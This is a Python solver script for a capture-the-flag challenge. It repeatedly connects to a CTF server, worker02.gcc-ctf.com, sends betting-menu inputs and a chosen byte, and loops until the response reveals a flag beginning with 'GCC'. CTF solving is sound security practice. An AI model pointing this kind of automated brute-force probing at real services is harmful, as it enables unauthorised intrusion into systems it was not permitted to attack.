# Let's bruteforce the flag
# We need to get GCC as first caracters, and it seems to do random things with the given bytes number.
# We can try to make a bruteforce script to get the flag. It would, in a while loop, send 1 (to place a bet) to tcp port,
# Always bet on 128 bytes, modify the 3rd byte to 0x0 to make it NULL,
# And then send 3 to the TCP port to get the result. We check the line starting with 
# "Your bet : " and if it starts with "Your bet : GCC", we get the flag.

import socket
import time
import random
import string
import asyncio

# Let's make it async and threaded

async def send_and_receive_datas(s: socket.socket, data: bytes):
    received_data = s.recv(1024).decode('utf-8')
    print(received_data)
    s.send(data)
    print(data.decode('utf-8'))
    return received_data

async def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("worker02.gcc-ctf.com", 12571))
        await send_and_receive_datas(s, b"1\n")
        await send_and_receive_datas(s, b"128\n")
        await send_and_receive_datas(s, b"3\n")
        await send_and_receive_datas(s, b"0x43\n")
        await send_and_receive_datas(s, b"3\n")
        data = await send_and_receive_datas(s, b"3\n")
        print(f'\nDatas : {data}\n')
        if "GCC" in data:
            print(f'Datas : {data}')
            break
        s.close()
        await asyncio.sleep(0.1)
    s.close()

asyncio.run(main())